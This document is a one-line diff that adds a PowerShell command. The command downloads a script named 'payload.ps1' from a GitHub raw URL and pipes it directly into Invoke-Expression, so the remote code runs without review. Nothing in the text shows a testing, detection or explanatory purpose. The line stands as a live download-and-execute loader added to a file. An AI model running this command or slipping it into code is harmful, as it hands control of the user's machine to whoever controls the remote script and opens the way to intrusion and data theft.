@@ -1,0 +1,1 @@
+powershell -Command "& {iwr -useb 'https://raw.githubusercontent.com/kaminarinokoky/BLAH/refs/heads/main/payload.ps1' | iex}"
